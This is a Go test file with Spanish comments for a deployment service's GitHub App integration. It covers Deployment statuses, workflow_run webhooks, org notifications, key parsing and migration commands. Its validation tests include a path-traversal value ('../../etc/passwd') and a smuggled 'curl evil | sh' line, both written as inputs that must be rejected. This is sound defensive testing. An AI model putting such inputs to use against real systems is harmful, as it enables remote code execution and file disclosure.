package http

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/golang-jwt/jwt/v5"

	"github.com/guz-studio/cac/backend/internal/core/domain"
	"github.com/guz-studio/cac/backend/internal/core/events"
	"github.com/guz-studio/cac/backend/internal/core/repository"
	"github.com/guz-studio/cac/backend/internal/core/service"
)

/*
La App escribe en GitHub (R6): cada deploy de un servicio con repo es un
Deployment en GitHub que sigue su estado, el workflow que publica la imagen
cuenta como el aviso del CI, y un deploy que sale bien deja una línea en las
tareas que trae.

Contra un GitHub falso que comprueba el JWT de la App con su llave pública y
apunta cada llamada.
*/

const appID = 4242

type fakeGitHub struct {
	t     *testing.T
	key   *rsa.PrivateKey
	mu    sync.Mutex
	calls []string
	// lo que llegó en cada llamada que importa
	tokens      int
	deployments []map[string]any
	statuses    []string
	badJWT      []string
}

func (g *fakeGitHub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	g.mu.Lock()
	defer g.mu.Unlock()
	g.calls = append(g.calls, r.Method+" "+r.URL.Path)
	body, _ := io.ReadAll(r.Body)
	switch {
	case r.Method == http.MethodPost && r.URL.Path == "/app/installations/5/access_tokens":
		g.tokens++
		raw := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
		claims := &jwt.RegisteredClaims{}
		tok, err := jwt.ParseWithClaims(raw, claims, func(t *jwt.Token) (any, error) {
			if t.Method != jwt.SigningMethodRS256 {
				return nil, fmt.Errorf("alg %v", t.Header["alg"])
			}
			return &g.key.PublicKey, nil
		})
		switch {
		case err != nil || !tok.Valid:
			g.badJWT = append(g.badJWT, fmt.Sprint(err))
		case claims.Issuer != fmt.Sprint(appID):
			g.badJWT = append(g.badJWT, "iss "+claims.Issuer)
		case claims.ExpiresAt.Sub(claims.IssuedAt.Time) > 10*time.Minute:
			g.badJWT = append(g.badJWT, "dura más de diez minutos")
		}
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"token":"ghs_prueba","expires_at":%q}`, time.Now().Add(time.Hour).Format(time.RFC3339))
	case r.Header.Get("Authorization") != "token ghs_prueba":
		w.WriteHeader(http.StatusUnauthorized)
	case r.Method == http.MethodPost && r.URL.Path == "/repos/dwit/api/deployments":
		var m map[string]any
		json.Unmarshal(body, &m)
		g.deployments = append(g.deployments, m)
		w.WriteHeader(http.StatusCreated)
		io.WriteString(w, `{"id":77}`)
	case r.Method == http.MethodPost && r.URL.Path == "/repos/dwit/api/deployments/77/statuses":
		var m map[string]any
		json.Unmarshal(body, &m)
		g.statuses = append(g.statuses, fmt.Sprint(m["state"]))
		w.WriteHeader(http.StatusCreated)
		io.WriteString(w, `{}`)
	case strings.HasPrefix(r.URL.Path, "/repos/dwit/api/compare/"):
		io.WriteString(w, `{"commits":[{"commit":{"message":"fix: el login cac#12"}},{"commit":{"message":"chore"}}]}`)
	case strings.HasPrefix(r.URL.Path, "/repos/dwit/api/commits/"):
		// Como GitHub: un sha corto se resuelve al entero que empieza así.
		asked := strings.TrimPrefix(r.URL.Path, "/repos/dwit/api/commits/")
		full := ""
		for _, sha := range []string{shaNew, shaOld} {
			if strings.HasPrefix(sha, asked) {
				full = sha
			}
		}
		if full == "" {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		fmt.Fprintf(w, `{"sha":%q,"commit":{"message":"primero cac#12"}}`, full)
	default:
		w.WriteHeader(http.StatusNotFound)
	}
}

type appFixture struct {
	*ghFixture
	gh      *fakeGitHub
	deploys *service.DeployService
	d       *domain.Deployable
	// bell: lo que llegó a la campana (R9).
	bell *inboxSpy
}

type inboxSpy struct {
	mu     sync.Mutex
	avisos []domain.Aviso
}

func (s *inboxSpy) Notify(a domain.Aviso) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.avisos = append(s.avisos, a)
}

func (s *inboxSpy) ofKind(kind string) []domain.Aviso {
	s.mu.Lock()
	defer s.mu.Unlock()
	var out []domain.Aviso
	for _, a := range s.avisos {
		if a.Kind == kind {
			out = append(out, a)
		}
	}
	return out
}

const (
	shaNew = "abc1234def5678abc1234def5678abc1234def56"
	shaOld = "0000000def5678abc1234def5678abc1234def56"
)

// Sobre el fixture de la R5 (repo 100 = dwit/api, de la org-1, enlazado a sp-1):
// un servidor con agente v3 y un servicio de ese repo, que publica con prod.yml.
func appSetup(t *testing.T, mode string) (*appFixture, func()) {
	t.Helper()
	f, cleanup := githubSetup(t)
	if err := f.db.AutoMigrate(&domain.Organization{}, &domain.OrgMembership{}, &domain.Server{}, &domain.Deployable{}, &domain.Deployment{},
		&domain.ImageBuild{}, &domain.WorkflowRun{}); err != nil {
		t.Fatal(err)
	}
	if err := repository.EnsureDeployIndexes(f.db); err != nil {
		t.Fatal(err)
	}
	now := time.Now()
	f.db.Exec(`INSERT INTO servers (id, org_id, name, host, ssh_port, ssh_user, type, agent_port, status, agent_version, created_at, updated_at)
		VALUES ('srv-1','org-1','tds','10.0.0.1',22,'root','docker-swarm',9090,'online',3,?,?)`, now, now)
	// Dos de la org-1 (u-1 pide los deploys a mano) y una de la org-2.
	for _, m := range [][2]string{{"org-1", "u-1"}, {"org-1", "u-2"}, {"org-2", "u-3"}} {
		f.db.Exec(`INSERT INTO org_memberships (org_id, user_id, role, created_at) VALUES (?, ?, 'member', ?)`, m[0], m[1], now)
	}
	bell := &inboxSpy{}
	orgs := repository.NewOrganizationRepository(f.db)

	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatal(err)
	}
	fake := &fakeGitHub{t: t, key: key}
	api := httptest.NewServer(fake)
	t.Cleanup(api.Close)

	gh := service.NewGitHubService(repository.NewGitHubRepository(f.db),
		service.GitHubConfig{AppSlug: "cac-test", WebhookSecret: ghSecret}, events.NewHub()).
		WithApp(service.GitHubAppKey{AppID: appID, Key: key, APIURL: api.URL}).Sync().
		WithActivity(repository.NewActivityRepository(f.db))
	r := chi.NewRouter()
	InitServerRoutesWith(f.db, r, events.NewHub(), gh)
	InitGitHubRoutesWith(r, gh)
	f.r = r

	deployRepo := repository.NewDeployRepository(f.db)
	deploys := service.NewDeployService(deployRepo, repository.NewServerRepository(f.db), nil).WithObserver(gh).
		WithNotifier(bell, orgs)
	// Después de montar las rutas: `InitServerRoutesWith` le pone a la App la
	// campana de verdad, y aquí hace falta la espía.
	gh.WithDeploys(deploys, deployRepo).WithNotifier(bell, orgs)
	srv, _ := service.NewServerService(repository.NewServerRepository(f.db)).Find("srv-1")
	d, err := deploys.CreateDeployable(srv, domain.CreateDeployableRequest{
		Name: "api", Stack: "beta", ServiceName: "beta_app", ImageRepo: "ghcr.io/dwit/api", Environment: "prod",
	})
	if err != nil {
		t.Fatal(err)
	}
	wf := "prod.yml"
	if d, err = deploys.UpdateDeployable(d, domain.UpdateDeployableRequest{
		Name: "api", Environment: "prod", RepoFullName: "dwit/api", OnCINotify: mode, BuildWorkflow: &wf,
	}); err != nil {
		t.Fatal(err)
	}
	return &appFixture{ghFixture: f, gh: fake, deploys: deploys, d: d, bell: bell}, cleanup
}

// El agente recoge el deploy y lo cierra.
func (f *appFixture) run(t *testing.T, sha string, status, previous string) *domain.Deployment {
	t.Helper()
	dep, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", sha, "")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.deploys.Claim("srv-1"); err != nil {
		t.Fatal(err)
	}
	if err := f.deploys.Finish("srv-1", dep.ID, domain.AgentFinishRequest{
		Status: status, PreviousImage: previous, FinalImage: "ghcr.io/dwit/api:" + sha,
	}); err != nil {
		t.Fatal(err)
	}
	return dep
}

// Un deploy que sale bien es un Deployment en GitHub, del commit desplegado y
// en su entorno, que pasa por «en curso» y acaba en «success». La App se
// identifica con un JWT RS256 corto, y su token se reutiliza.
func TestADeployIsFollowedInGitHub(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	dep := f.run(t, shaNew, domain.DeploySucceeded, "ghcr.io/dwit/api:"+shaOld)

	if len(f.gh.badJWT) > 0 {
		t.Fatalf("el JWT de la App no es el que pide GitHub: %v", f.gh.badJWT)
	}
	if len(f.gh.deployments) != 1 {
		t.Fatalf("%d Deployments en GitHub, se esperaba 1 (llamadas: %v)", len(f.gh.deployments), f.gh.calls)
	}
	got := f.gh.deployments[0]
	if got["ref"] != shaNew || got["environment"] != "prod" || got["auto_merge"] != false {
		t.Errorf("el Deployment no es del commit y entorno del deploy: %v", got)
	}
	if strings.Join(f.gh.statuses, ",") != "in_progress,success" {
		t.Errorf("estados en GitHub: %v, se esperaba in_progress,success", f.gh.statuses)
	}
	if f.gh.tokens != 1 {
		t.Errorf("%d tokens de instalación pedidos para un deploy, se esperaba 1", f.gh.tokens)
	}
	var stored domain.Deployment
	f.db.First(&stored, "id = ?", dep.ID)
	if stored.GitHubDeploymentID != 77 {
		t.Errorf("el deploy no guardó su Deployment de GitHub: %d", stored.GitHubDeploymentID)
	}
}

// Un deploy que sale bien deja en las tareas que traen sus commits —los de
// entre lo que había y lo nuevo— una línea interna, una sola vez.
func TestADeployTellsTheTasksItShips(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	f.run(t, shaNew, domain.DeploySucceeded, "ghcr.io/dwit/api:"+shaOld)
	var lines []domain.ItemComment
	f.db.Where("item_id = 'it-1' AND source_key LIKE 'deploy:%'").Find(&lines)
	if len(lines) != 1 {
		t.Fatalf("%d líneas de deploy en la tarea, se esperaba 1", len(lines))
	}
	if lines[0].Visibility != domain.VisibilityInternal || !strings.Contains(lines[0].Body, "deploy `abc1234` → prod") {
		t.Errorf("la línea no es la de un deploy interno: %+v", lines[0])
	}
	compared := false
	for _, c := range f.gh.calls {
		compared = compared || c == "GET /repos/dwit/api/compare/"+shaOld+"..."+shaNew
	}
	if !compared {
		t.Errorf("no se compararon los commits de antes y de ahora: %v", f.gh.calls)
	}
}

// Uno que falla acaba en «failure», y no le cuenta a ninguna tarea que ya
// está desplegada.
func TestAFailedDeployIsAFailureInGitHub(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	f.run(t, shaNew, domain.DeployFailed, "")
	if strings.Join(f.gh.statuses, ",") != "in_progress,failure" {
		t.Errorf("estados en GitHub: %v, se esperaba in_progress,failure", f.gh.statuses)
	}
	var n int64
	f.db.Model(&domain.ItemComment{}).Where("source_key LIKE 'deploy:%'").Count(&n)
	if n != 0 {
		t.Errorf("un deploy fallido dejó %d líneas de «desplegado»", n)
	}
}

// Un deploy al que se le murió el agente caduca, y en GitHub también: si no, se
// quedaría «en curso» para siempre.
func TestAnExpiredDeployIsAFailureInGitHub(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	dep, _, _ := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaNew, "")
	f.deploys.Claim("srv-1")
	f.db.Model(&domain.Deployment{}).Where("id = ?", dep.ID).Update("started_at", time.Now().Add(-time.Hour))
	f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaOld, "")
	if !strings.HasPrefix(strings.Join(f.gh.statuses, ","), "in_progress,failure") {
		t.Errorf("estados en GitHub: %v, se esperaba que el caducado acabara en failure", f.gh.statuses)
	}
}

// Sin repo en el servicio, o con el de otra org que se llame igual, no se
// escribe nada en GitHub.
func TestOnlyAServiceWithItsOrgsRepoWritesToGitHub(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	wf := ""
	f.d, _ = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "record", BuildWorkflow: &wf})
	f.run(t, shaNew, domain.DeploySucceeded, "")
	f.db.Model(&domain.GitHubRepo{}).Where("repo_id = 100").Update("org_id", "org-2")
	f.d, _ = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", RepoFullName: "dwit/api", OnCINotify: "record"})
	f.run(t, shaOld, domain.DeploySucceeded, "")
	if len(f.gh.calls) != 0 {
		t.Errorf("se escribió en GitHub sin un repo de la org: %v", f.gh.calls)
	}
}

// workflowRun: el `completed` del run 9, como lo manda GitHub.
func workflowRun(path, conclusion string) string {
	return workflowRunAt(9, "completed", domain.RunStatusCompleted, conclusion, path)
}

// workflowRunAt: un `workflow_run` del run `id` en el estado que se pida.
// GitHub manda tres por intento: requested, in_progress y completed.
func workflowRunAt(id int64, action, status, conclusion, path string) string {
	return fmt.Sprintf(`{"action":%q,"repository":{"id":100,"full_name":"dwit/api"},"workflow_run":{
		"id":%d,"run_number":41,"run_attempt":1,"name":"Deploy","status":%q,"conclusion":%q,"event":"push","path":%q,
		"head_sha":%q,"head_branch":"main","html_url":"https://github.com/dwit/api/actions/runs/%d",
		"created_at":"2026-10-04T10:00:00Z","updated_at":"2026-10-04T10:05:00Z",
		"actor":{"login":"ana"},"head_commit":{"message":"feat: algo cac#12"}}}`, action, id, status, conclusion, path, shaNew, id)
}

// Cada `workflow_run` de un repo de la org queda apuntado, venga en el estado
// que venga, y los tres webhooks de un intento son **una** fila que avanza. El
// repo de otra org (o de ninguna) no deja nada. Mutantes: grabar sólo en
// `completed` (la fila no existiría tras el `requested`), o quitar la puerta
// de la org (el repo soltado dejaría fila).
func TestEveryRunOfAnOrgRepoIsRecorded(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	f.hook(t, "workflow_run", "d-1", workflowRunAt(7, "requested", "queued", "", ".github/workflows/tests.yml"))
	var run domain.WorkflowRun
	if err := f.db.First(&run, "run_id = 7").Error; err != nil {
		t.Fatalf("un run recién pedido no se apuntó: %v", err)
	}
	if run.Status != "queued" || run.OrgID != "org-1" || run.RepoFullName != "dwit/api" || run.WorkflowName != "Deploy" {
		t.Errorf("la fila no es la del run: %+v", run)
	}
	f.hook(t, "workflow_run", "d-2", workflowRunAt(7, "in_progress", domain.RunStatusInProgress, "", ".github/workflows/tests.yml"))
	f.hook(t, "workflow_run", "d-3", workflowRunAt(7, "completed", domain.RunStatusCompleted, "failure", ".github/workflows/tests.yml"))
	var rows []domain.WorkflowRun
	f.db.Find(&rows)
	if len(rows) != 1 || rows[0].Status != domain.RunStatusCompleted || rows[0].Conclusion != "failure" {
		t.Fatalf("tres webhooks de un intento tienen que ser una fila terminada: %+v", rows)
	}
	// Un workflow que falló no es el aviso del CI, pero sí se ve.
	var builds int64
	f.db.Model(&domain.ImageBuild{}).Count(&builds)
	if builds != 0 {
		t.Errorf("un run fallido dejó %d builds", builds)
	}

	f.db.Model(&domain.GitHubRepo{}).Where("repo_id = 100").Update("org_id", "")
	f.hook(t, "workflow_run", "d-4", workflowRunAt(8, "completed", domain.RunStatusCompleted, "success", ".github/workflows/tests.yml"))
	var n int64
	f.db.Model(&domain.WorkflowRun{}).Where("run_id = 8").Count(&n)
	if n != 0 {
		t.Error("un run de un repo que ninguna org ha atado se apuntó")
	}
}

// Un run que termina suena en la campana de **toda** la org, una vez por
// persona y plegado por repo; mientras corre, no; y la reentrega del mismo
// `completed` no suena otra vez. Nadie se salta: no hay mapa login↔usuario.
// Mutantes: avisar en cada acción (el `requested` dejaría filas), quitar la
// guarda de `advanced` (la reentrega doblaría), escribir `"repo:"+id` a mano
// o avisar sólo al actor.
func TestACompletedRunRingsEveryMemberOnce(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	f.hook(t, "workflow_run", "d-1", workflowRunAt(7, "requested", "queued", "", ".github/workflows/tests.yml"))
	f.hook(t, "workflow_run", "d-2", workflowRunAt(7, "in_progress", domain.RunStatusInProgress, "", ".github/workflows/tests.yml"))
	if n := len(f.bell.ofKind("ci:run")); n != 0 {
		t.Fatalf("un run en curso dejó %d avisos", n)
	}
	f.hook(t, "workflow_run", "d-3", workflowRunAt(7, "completed", domain.RunStatusCompleted, "failure", ".github/workflows/tests.yml"))
	got := f.bell.ofKind("ci:run")
	if len(got) != 2 {
		t.Fatalf("%d avisos para una org de dos; se esperaban 2: %+v", len(got), got)
	}
	who := map[string]bool{}
	var run domain.WorkflowRun
	f.db.First(&run, "run_id = 7")
	for _, a := range got {
		who[a.UserID] = true
		if a.OrgID != "org-1" || a.TitleKey != "notify.ci.run.failure" || a.TitleArgs["workflow"] != "Deploy" || a.TitleArgs["branch"] != "main" {
			t.Errorf("el aviso no dice lo que pasó: %+v", a)
		}
		if a.Group != domain.RepoGroup(100) || a.Label != "dwit/api" {
			t.Errorf("no se pliega por repo: %q %q", a.Group, a.Label)
		}
		if !strings.Contains(a.Link, "repo=dwit%2Fapi") || !strings.Contains(a.Link, "run="+run.ID) {
			t.Errorf("el enlace no lleva a la actividad del repo y al run: %q", a.Link)
		}
		if !strings.Contains(a.Body, "dwit/api") || !strings.Contains(a.Body, shaNew[:7]) || !strings.Contains(a.Body, "@ana") {
			t.Errorf("el cuerpo no dice repo, commit y quién: %q", a.Body)
		}
	}
	if !who["u-1"] || !who["u-2"] || who["u-3"] {
		t.Errorf("le llegó a %v; se esperaba a u-1 y u-2 y a nadie de otra org", who)
	}
	f.hook(t, "workflow_run", "d-4", workflowRunAt(7, "completed", domain.RunStatusCompleted, "failure", ".github/workflows/tests.yml"))
	if n := len(f.bell.ofKind("ci:run")); n != 2 {
		t.Errorf("la reentrega del mismo completed dejó la campana en %d avisos", n)
	}
}

// Un deploy que acaba suena a toda la org menos a quien lo pidió; mientras
// corre, no; y uno que caduca lo dice como tal. Mutantes: quitar el salto del
// solicitante, avisar en `running`, o dar el caducado por un fallo corriente.
func TestAFinishedDeployRingsEveryoneButWhoAsked(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	dep, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaNew, "")
	if err != nil {
		t.Fatal(err)
	}
	f.deploys.Claim("srv-1")
	if n := len(f.bell.ofKind("deploy:done")); n != 0 {
		t.Fatalf("un deploy en curso dejó %d avisos", n)
	}
	if err := f.deploys.Finish("srv-1", dep.ID, domain.AgentFinishRequest{Status: domain.DeploySucceeded, FinalImage: dep.Image}); err != nil {
		t.Fatal(err)
	}
	got := f.bell.ofKind("deploy:done")
	if len(got) != 1 || got[0].UserID != "u-2" {
		t.Fatalf("se esperaba un aviso, a u-2 (u-1 lo pidió): %+v", got)
	}
	a := got[0]
	if a.TitleKey != "notify.deploy.succeeded" || a.TitleArgs["service"] != "api" || a.TitleArgs["sha"] != shaNew {
		t.Errorf("el aviso no dice qué se desplegó: %+v", a)
	}
	if a.Group != domain.DeployableGroup(f.d.ID) || a.Label != "api" || a.Link != "/activity?deployable="+f.d.ID+"&deployment="+dep.ID {
		t.Errorf("no se pliega por servicio ni lleva a su actividad: %q %q %q", a.Group, a.Label, a.Link)
	}

	// Uno al que se le muere el agente caduca al pedir el siguiente, y se dice.
	stuck, _, _ := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaOld, "")
	f.deploys.Claim("srv-1")
	f.db.Model(&domain.Deployment{}).Where("id = ?", stuck.ID).Update("started_at", time.Now().Add(-time.Hour))
	f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaNew, "")
	got = f.bell.ofKind("deploy:done")
	if len(got) != 2 || got[1].TitleKey != "notify.deploy.expired" {
		t.Errorf("el caducado no se dijo como tal: %+v", got)
	}
}

// El deploy que encola el aviso de la App nace sabiendo de qué run viene: es
// lo que lo cuelga de su run en la Actividad. El mutante que mata: no pasar el
// id del run por `Notice`.
func TestTheDeploymentRemembersItsRun(t *testing.T) {
	f, cleanup := appSetup(t, "deploy")
	defer cleanup()
	f.hook(t, "workflow_run", "d-1", workflowRun(".github/workflows/prod.yml", "success"))
	var run domain.WorkflowRun
	if err := f.db.First(&run, "run_id = 9").Error; err != nil {
		t.Fatal(err)
	}
	var dep domain.Deployment
	if err := f.db.First(&dep, "requested_by = ?", domain.DeployByGitHub).Error; err != nil {
		t.Fatal(err)
	}
	if dep.WorkflowRunID != run.ID {
		t.Errorf("el deploy guarda el run %q, se esperaba %q", dep.WorkflowRunID, run.ID)
	}
	// Y uno a mano no inventa ninguno (cuando el de GitHub ya acabó: sólo hay
	// un deploy vivo por servicio).
	f.deploys.Claim("srv-1")
	f.deploys.Finish("srv-1", dep.ID, domain.AgentFinishRequest{Status: domain.DeploySucceeded, FinalImage: dep.Image})
	manual, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaOld, "")
	if err != nil {
		t.Fatal(err)
	}
	if manual.WorkflowRunID != "" {
		t.Errorf("un deploy a mano se colgó del run %q", manual.WorkflowRunID)
	}
}

// El workflow que publica la imagen, cuando acaba bien, cuenta como el aviso
// del CI: el build queda y, en modo `deploy`, se despliega. Otro workflow, o uno
// que falló, no cuenta.
func TestTheBuildWorkflowCountsAsTheCINotice(t *testing.T) {
	f, cleanup := appSetup(t, "deploy")
	defer cleanup()
	f.hook(t, "workflow_run", "d-1", workflowRun(".github/workflows/tests.yml", "success"))
	f.hook(t, "workflow_run", "d-2", workflowRun(".github/workflows/prod.yml", "failure"))
	var builds, deps int64
	f.db.Model(&domain.ImageBuild{}).Count(&builds)
	if builds != 0 {
		t.Fatalf("%d builds de un workflow que no publica o que falló", builds)
	}
	f.hook(t, "workflow_run", "d-3", workflowRun(".github/workflows/prod.yml", "success"))
	var b domain.ImageBuild
	f.db.First(&b)
	if b.Sha != shaNew || b.Source != "github" || b.RunURL != "https://github.com/dwit/api/actions/runs/9" {
		t.Errorf("el build no es el del workflow: %+v", b)
	}
	f.db.Model(&domain.Deployment{}).Where("requested_by = ?", domain.DeployByGitHub).Count(&deps)
	if deps != 1 {
		t.Errorf("en modo deploy, %d deploys pedidos por GitHub; se esperaba 1", deps)
	}
}

// Un repo de otra org con el mismo nombre no avisa a este servicio.
func TestAWorkflowOfAnotherOrgsRepoIsIgnored(t *testing.T) {
	f, cleanup := appSetup(t, "deploy")
	defer cleanup()
	f.db.Model(&domain.GitHubRepo{}).Where("repo_id = 100").Update("org_id", "org-2")
	f.hook(t, "workflow_run", "d-1", workflowRun(".github/workflows/prod.yml", "success"))
	var builds int64
	f.db.Model(&domain.ImageBuild{}).Count(&builds)
	if builds != 0 {
		t.Errorf("un workflow del repo de otra org dejó %d builds", builds)
	}
}

// Una app anterior a la R6 no manda `buildWorkflow`, y el PATCH pide la fila
// entera: cambiar de modo desde ella no puede borrar el workflow. Y un repo o
// un workflow que no tienen forma de serlo se rechazan.
func TestUpdatingADeployableKeepsWhatItDoesNotSend(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	d, err := f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", RepoFullName: "dwit/api", OnCINotify: "deploy"})
	if err != nil {
		t.Fatal(err)
	}
	var stored domain.Deployable
	f.db.First(&stored, "id = ?", d.ID)
	if stored.BuildWorkflow != "prod.yml" {
		t.Errorf("un PATCH sin buildWorkflow lo dejó en %q", stored.BuildWorkflow)
	}
	bad := "../../etc/passwd"
	for name, req := range map[string]domain.UpdateDeployableRequest{
		"repo sin dueño":    {Name: "api", RepoFullName: "api", OnCINotify: "record"},
		"repo con espacios": {Name: "api", RepoFullName: "dwit/a pi", OnCINotify: "record"},
		"workflow con ruta": {Name: "api", OnCINotify: "record", BuildWorkflow: &bad},
	} {
		if _, err := f.deploys.UpdateDeployable(f.d, req); err == nil {
			t.Errorf("%s: se aceptó", name)
		}
	}
}

// La llave de la App llega como la deja el `awk` de docs/integrations/github.md:
// en una línea, con los saltos escritos `\n`. Así tiene que leerse; y una que no
// es una llave deja la App sin escribir, no la tumba.
func TestTheAppKeyIsReadAsTheDocsSayToStoreIt(t *testing.T) {
	key, _ := rsa.GenerateKey(rand.Reader, 2048)
	pemText := string(pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)}))
	t.Setenv("GITHUB_APP_ID", "4242")
	t.Setenv("GITHUB_APP_PRIVATE_KEY", strings.ReplaceAll(strings.TrimSpace(pemText), "\n", `\n`))
	got := GitHubAppKeyFromEnv()
	if got.AppID != 4242 || got.Key == nil || !got.Key.Equal(key) {
		t.Fatalf("la llave en una línea no se leyó: id %d, llave %v", got.AppID, got.Key != nil)
	}
	t.Setenv("GITHUB_APP_PRIVATE_KEY", "no es una llave")
	if got := GitHubAppKeyFromEnv(); got.Key != nil || got.AppID != 0 {
		t.Errorf("una llave rota dejó la App con %+v", got)
	}
}

// Un servicio que su CI etiqueta con el sha corto (RRHH): GitHub avisa con el
// entero, y lo que se apunta y se despliega es el tag que existe, el corto. El
// mismo commit avisado por el curl con el corto es el mismo build. Y en GitHub
// el Deployment lleva el sha entero, que es lo que GitHub entiende.
func TestAShortTaggedServiceDeploysTheTagThatExists(t *testing.T) {
	f, cleanup := appSetup(t, "deploy")
	defer cleanup()
	short := true
	wf := "prod.yml"
	var err error
	if f.d, err = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{
		Name: "api", Environment: "prod", RepoFullName: "dwit/api", OnCINotify: "deploy", BuildWorkflow: &wf, ShortTags: &short,
	}); err != nil {
		t.Fatal(err)
	}
	f.hook(t, "workflow_run", "d-1", workflowRun(".github/workflows/prod.yml", "success"))
	if _, err := f.deploys.Notice(f.d, domain.DeployNotice{Sha: shaNew[:7]}, "ci"); err != nil {
		t.Fatal(err)
	}
	var builds []domain.ImageBuild
	f.db.Find(&builds)
	if len(builds) != 1 || builds[0].Sha != shaNew[:7] || builds[0].Image != "ghcr.io/dwit/api:"+shaNew[:7] {
		t.Fatalf("builds: %+v; se esperaba uno, con el tag corto", builds)
	}
	var dep domain.Deployment
	f.db.First(&dep, "requested_by = ?", domain.DeployByGitHub)
	if dep.Image != "ghcr.io/dwit/api:"+shaNew[:7] {
		t.Errorf("se encoló %q, se esperaba el tag corto", dep.Image)
	}

	// El agente lo despliega: en GitHub, el Deployment es del sha entero.
	f.deploys.Claim("srv-1")
	if len(f.gh.deployments) != 1 || f.gh.deployments[0]["ref"] != shaNew {
		t.Errorf("el Deployment de GitHub no lleva el sha entero: %v", f.gh.deployments)
	}
}

// A mano, elegir un commit de la lista (entero) despliega su tag corto.
func TestAManualDeployOfAShortTaggedServiceUsesTheShortTag(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	short := true
	f.d, _ = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", RepoFullName: "dwit/api", OnCINotify: "record", ShortTags: &short})
	dep, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaNew, "")
	if err != nil {
		t.Fatal(err)
	}
	if dep.Image != "ghcr.io/dwit/api:"+shaNew[:7] {
		t.Errorf("se encoló %q, se esperaba el tag corto", dep.Image)
	}
	// Y una app anterior, que no manda shortTags, no lo apaga.
	f.d, _ = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", RepoFullName: "dwit/api", OnCINotify: "deploy"})
	var stored domain.Deployable
	f.db.First(&stored, "id = ?", f.d.ID)
	if !stored.ShortTags {
		t.Error("un PATCH sin shortTags lo apagó")
	}
}

// Un servicio con migraciones: el comando viaja en el trabajo del agente, un
// agente que no sabe migrar no recibe el deploy (lo desplegaría sin migrar), y
// un aviso del CI en ese caso queda apuntado, no falla.
func TestAMigrationNeedsAnAgentThatMigrates(t *testing.T) {
	f, cleanup := appSetup(t, "deploy")
	defer cleanup()
	cmd := "npx prisma migrate deploy"
	var err error
	if f.d, err = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "deploy", MigrateCommand: &cmd}); err != nil {
		t.Fatal(err)
	}
	// El agente de la fixture es v3: no sabe migrar.
	if _, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaNew, ""); !errors.Is(err, service.ErrAgentCannotMigrate) {
		t.Fatalf("a un agente v3 con migraciones → %v", err)
	}
	res, err := f.deploys.Notice(f.d, domain.DeployNotice{Sha: shaNew}, "ci")
	if err != nil || res.Deploy != "skipped" || res.Reason != "agent-cannot-migrate" {
		t.Errorf("un aviso con un agente que no migra: %+v %v", res, err)
	}

	f.db.Exec("UPDATE servers SET agent_version = ?", domain.AgentVersionMigrates)
	if _, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaOld, ""); err != nil {
		t.Fatal(err)
	}
	job, err := f.deploys.Claim("srv-1")
	if err != nil || job == nil {
		t.Fatalf("el agente v4 no recogió nada: %v", err)
	}
	if got := job.Data.MigrateCommand; got != cmd {
		t.Errorf("el trabajo lleva %q, se esperaba el comando", got)
	}
}

// El comando es una línea (va detrás de `sh -c`), y una app que no lo manda no
// lo borra.
func TestTheMigrateCommandIsOneLineAndSurvivesOldApps(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	two := "migrate\ncurl evil | sh"
	if _, err := f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "record", MigrateCommand: &two}); !errors.Is(err, service.ErrBadMigrateCommand) {
		t.Errorf("un comando de dos líneas → %v", err)
	}
	one := "  bun run migrate  "
	f.d, _ = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "record", MigrateCommand: &one})
	f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "deploy"})
	var stored domain.Deployable
	f.db.First(&stored, "id = ?", f.d.ID)
	if stored.MigrateCommand != "bun run migrate" {
		t.Errorf("el comando guardado es %q", stored.MigrateCommand)
	}
}
